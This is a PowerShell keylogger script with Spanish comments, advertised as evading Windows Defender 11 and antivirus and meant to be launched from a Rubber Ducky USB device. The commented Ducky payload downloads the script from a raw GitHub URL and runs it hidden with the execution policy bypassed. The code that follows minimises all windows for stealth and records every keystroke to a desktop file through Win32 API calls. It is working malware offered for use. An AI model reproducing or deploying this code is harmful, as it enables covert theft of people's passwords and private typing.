# ---------------------------------------------------------
# By Ruben Guerrero Muñoz - 2025
# ---------------------------------------------------------


# Keylogger capaz de evadir Windows Defender 11 y Antivirus.

# Creado con la idea de ejecutarlo remotamente desde un rubberducky.

# ---------------------------------------------------------
# PAYLOAD para RUBBER DUCKY;
# ---------------------------------------------------------

# DELAY 20
# GUI r
# DELAY 20
# STRING cmd
# ENTER	
# ENTER
# DELAY 20
# STRING powershell
# ENTER
# DELAY 20
# STRING Invoke-WebRequest -Uri "https://raw.githubusercontent.com/C4sp3r2222/duckylog/main/script.ps1" -OutFile "$env:USERPROFILE\Desktop\script.ps1"
# ENTER
# DELAY 300
# STRING powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command "Start-Process powershell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -File C:\Users\$env:USERNAME\Desktop\script.ps1' -WindowStyle Hidden -ErrorAction SilentlyContinue"
# ENTER


# ---------------------------------------------------------
# EJECUCION en Powershell en modo sigiloso y persistente:
# ---------------------------------------------------------

# powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command "Start-Process powershell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -File C:\Users\$env:USERNAME\Desktop\script.ps1' -WindowStyle Hidden -ErrorAction SilentlyContinue"

# ---------------------------------------------------------
# DETENCION DE SCRIPT:
# ---------------------------------------------------------

# Ejecutar en Powershell:
# Get-CimInstance Win32_Process | Where-Object { $_.CommandLine -like '*script.ps1*' } | Select-Object ProcessId, CommandLine

# (Veremos un numero de proceso asociado Ej: 1234 )

# Para detenerlo, ejecutar en powershell:
# Stop-Process -Id 1234 -Force

# (Detenemos el proceso)



function Write-Color {
    param (
        [string]$Text,
        [ConsoleColor]$Color = 'White'
    )
    $oldColor = $Host.UI.RawUI.ForegroundColor
    $Host.UI.RawUI.ForegroundColor = $Color
    Write-Host $Text
    $Host.UI.RawUI.ForegroundColor = $oldColor
}

# Minimizar la ventana para ejecución sigilosa
Add-Type -AssemblyName PresentationFramework
$shell = New-Object -ComObject Shell.Application
$hwnd = (Get-Process -Id $PID).MainWindowHandle
$shell.MinimizeAll()


Write-Color "[+] Iniciando Keylogger..." Cyan
Start-Sleep -Seconds 1

Write-Color "[+] El documento resultante sera almacenado en: keylogger.txt" Yellow
Write-Color "[+] Para detener el proceso ejecute en una nueva CMD o PowerShell los siguientes comandos:" Green
Write-Color "    1º - Detectar el nº de proceso asociado:" Green
Write-Color "        Get-CimInstance Win32_Process | Where-Object { $_.CommandLine -like '*script.ps1*' } | Select-Object ProcessId, CommandLine" DarkGray
Write-Color "    2º - Finalizar el proceso:" Green
Write-Color "        Stop-Process -Id <ID_PROCESS> -Force" DarkGray
Write-Color "[+] La ventana actual se minimiza para que la ejecución sea sigilosa." Cyan


$path = "$env:USERPROFILE\Desktop\keylogger.txt"

if ((Test-Path $path) -eq $false) {New-Item $path}

$signatures = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
public static extern short GetAsyncKeyState(int virtualKeyCode);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@

$API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru

try {
    while ((Test-Path $path) -ne $false) {
        Start-Sleep -Milliseconds 40
        for ($ascii = 9; $ascii -le 254; $ascii++) {
            $state = $API::GetAsyncKeyState($ascii)
            if ($state -eq -32767) {
                $null = [console]::CapsLock
                $virtualKey = $API::MapVirtualKey($ascii, 3)
                $kbstate = New-Object -TypeName Byte[] -ArgumentList 256
                $checkkbstate = $API::GetKeyboardState($kbstate)
                $mychar = New-Object -TypeName System.Text.StringBuilder
                $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)
                if ($success -and (Test-Path $path) -eq $true) {
                    [System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode)
                }
            }
        }
    }
} 
finally { exit }
